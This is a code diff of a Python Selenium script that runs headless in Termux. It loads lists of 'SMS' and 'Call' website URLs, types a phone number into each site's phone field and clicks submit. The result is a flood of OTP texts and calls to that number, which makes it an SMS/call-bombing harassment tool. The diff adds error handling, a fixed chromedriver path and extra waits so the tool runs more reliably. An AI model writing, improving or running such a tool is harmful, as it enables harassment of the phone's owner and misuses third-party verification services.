@@ -1,5 +1,4 @@
 import time
-import threading
 import os
 from selenium import webdriver
 from selenium.webdriver.common.by import By
@@ -9,20 +8,16 @@ from selenium.webdriver.chrome.service import Service
 # --- CONFIGURATION ---
 SMS_FILE = "sms.txt"
 CALL_FILE = "call.txt"
-SELECTORS_FILE = "selectors.txt"
 
-selectors = {}
 success = 0
 failed = 0
 
-# --- LOAD LINKS FROM FILES ---
 def load_links(filename):
     if not os.path.exists(filename):
         return []
     with open(filename, "r") as f:
         return [line.strip() for line in f if line.strip() and line.startswith("http")]
 
-# --- BROWSER SETUP (TERMUX HEADLESS) ---
 def create_driver():
     options = Options()
     options.add_argument("--headless") 
@@ -31,42 +26,53 @@ def create_driver():
     options.add_argument("--disable-gpu")
     options.add_argument("user-agent=Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36")
     
-    driver = webdriver.Chrome(options=options)
-    driver.set_page_load_timeout(20)
-    return driver
+    # Termux Fixed Path for Chromedriver
+    service = Service('/data/data/com.termux/files/usr/bin/chromedriver')
+    
+    try:
+        driver = webdriver.Chrome(service=service, options=options)
+        driver.set_page_load_timeout(25)
+        return driver
+    except Exception as e:
+        print(f"Driver Error: {str(e)}")
+        return None
 
-# --- SMART DETECTION LOGIC ---
 def auto_detect_and_send(driver, mobile):
-    # Search for Mobile Input
-    m_box = None
-    inputs = driver.find_elements(By.TAG_NAME, "input")
-    for i in inputs:
-        attr = (i.get_attribute("type") or "") + (i.get_attribute("name") or "") + (i.get_attribute("placeholder") or "")
-        attr = attr.lower()
-        if any(x in attr for x in ["tel", "mobile", "phone", "number"]):
-            m_box = i
-            break
-    
-    if not m_box: return False
+    try:
+        m_box = None
+        inputs = driver.find_elements(By.TAG_NAME, "input")
+        for i in inputs:
+            attr = (i.get_attribute("type") or "") + (i.get_attribute("name") or "") + (i.get_attribute("placeholder") or "")
+            attr = attr.lower()
+            if any(x in attr for x in ["tel", "mobile", "phone", "number"]):
+                m_box = i
+                break
+        
+        if not m_box: return False
 
-    # Search for Button
-    btn = None
-    buttons = driver.find_elements(By.TAG_NAME, "button")
-    if not buttons:
-        buttons = driver.find_elements(By.XPATH, "//input[@type='submit' or @type='button']")
-    
-    if buttons:
-        btn = buttons[0]
-        m_box.send_keys(mobile)
-        time.sleep(1)
-        btn.click()
-        return True
+        btn = None
+        buttons = driver.find_elements(By.TAG_NAME, "button")
+        if not buttons:
+            buttons = driver.find_elements(By.XPATH, "//input[@type='submit' or @type='button']")
+        
+        if buttons:
+            btn = buttons[0]
+            m_box.send_keys(mobile)
+            time.sleep(1)
+            btn.click()
+            time.sleep(2)
+            return True
+    except:
+        pass
     return False
 
-# --- ATTEMPT WORKER ---
 def attempt(site, mobile):
     global success, failed
     driver = create_driver()
+    if not driver:
+        failed += 1
+        return
+
     try:
         driver.get(site)
         time.sleep(5)
@@ -82,7 +88,6 @@ def attempt(site, mobile):
     finally:
         driver.quit()
 
-# --- MAIN INTERFACE ---
 def main():
     os.system("clear")
     print("==============================")
@@ -94,11 +99,7 @@ def main():
     call_links = load_links(CALL_FILE)
     
     print(f"\nLoaded: {len(sms_links)} SMS sites | {len(call_links)} Call sites")
-    print("\nSelect Mode:")
-    print("1. SMS Mode")
-    print("2. Call Mode")
-    print("3. Mixed Mode (Both)")
-    
+    print("\nSelect Mode: 1.SMS | 2.Call | 3.Both")
     choice = input("\nChoice: ")
     
     targets = []
@@ -107,13 +108,11 @@ def main():
     elif choice == "3": targets = sms_links + call_links
     
     if not targets:
-        print("No links found in txt files!")
+        print("No links found!")
         return
 
-    print(f"\nStarting on {len(targets)} sites...")
-    print("Press CTRL+C to stop.\n")
+    print(f"\nRunning on {len(targets)} sites...")
 
-    # Serial execution for Termux stability
     for site in targets:
         attempt(site, mobile)
         time.sleep(1)
@@ -122,7 +121,4 @@ def main():
     print(f"Total Success: {success} | Total Failed: {failed}")
 
 if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        print("\nStopped by user.")
+    main()
